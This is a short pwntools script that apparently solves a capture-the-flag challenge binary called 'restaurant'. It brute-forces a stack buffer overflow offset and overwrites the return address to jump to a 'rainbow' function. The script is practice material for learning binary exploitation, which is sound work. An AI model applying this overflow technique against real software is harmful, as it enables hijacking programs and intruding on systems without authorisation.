#!/usr/bin/env python3

from pwn import *
from pprint import pprint
from os import remove

if __name__ == "__main__":
    context.binary = 'restaurant'

    prog = ELF('restaurant')
    lib = ELF('libc.so.6')

    print(prog)
    print(lib)

    print(f'rainbow @ {hex(prog.symbols["rainbow"])}')
    offset = None
    for i in range(32, 50):
        with process('./restaurant') as proc:
            proc.recvuntil(b'> ')
            proc.sendline(b'1')
            proc.recvuntil(b'> ')
            proc.sendline(b'\x40' * i + pack(prog.symbols['rainbow']))
            try:
                print(proc.readline())
                print(proc.readline())
                offset = i
                break
            except EOFError:
                pass
    print(f'offset @ {offset}')

    with process('./restaurant') as proc:
        proc.recvuntil(b'> ')
        proc.sendline(b'1')
        proc.recvuntil(b'> ')
        proc.sendline(b'\x40' * offset + pack(prog.symbols['rainbow']))
        print(proc.readline())
        print(proc.readline())
        print(proc.readline())
        print(proc.readline())
